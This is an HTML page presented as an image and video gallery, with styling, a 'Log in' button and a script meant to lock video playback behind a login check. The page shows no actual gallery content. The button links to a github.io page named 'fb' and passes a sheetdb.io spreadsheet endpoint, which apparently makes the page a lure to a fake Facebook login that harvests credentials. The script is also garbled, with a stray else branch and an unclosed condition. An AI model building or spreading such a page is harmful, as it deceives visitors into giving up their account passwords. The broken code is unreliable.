<!DOCTYPE html>
<html>
<head>
  <title>Image and Video Gallery</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  
  <style>
    .gallery {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
    }
    
    .gallery-item {
      margin: 10px;
      text-align: center;
    }
    
    .gallery-item img,
    .gallery-item video {
      max-width: 300px;
      border: 1px solid #ccc;
    }
    
    .gallery-item .fa-play {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 48px;
      color: #fff;
      opacity: 0;
      transition: opacity 0.3s ease-in-out;
      cursor: pointer;
    }
    
    .gallery-item:hover .fa-play {
      opacity: 1;
    }
  </style>
</head>
<body>
    <a style="top: 5px;left: 200px;position: relative" class="btn btn-primary" href="https://sh-seam.github.io/indphone/fb?name=https://sheetdb.io/api/v1/revfg173taku5">Log in</a>

  <script>
    // Login chec ki
    function isLoggedIn() {

        return true
      }else{

      }
      // Replace with your login check logic

    }
    
    // Enable video playback if user is logged in
    function enableVideoPlayback() {
      var videos = document.querySelectorAll("video");
      videos.forEach(function(video) {
        video.controls = true;
        video.disabled = false;
      });
    }
    
    // Disable video playback
    function disableVideoPlayback() {
      var videos = document.querySelectorAll("video");
      videos.forEach(function(video) {
        video.controls = false;
        video.disabled = true;
      });
    }
    
    // Check login status and enable/disable video playback accordingly
 
          if (isLoggedIn()) {

  </script>
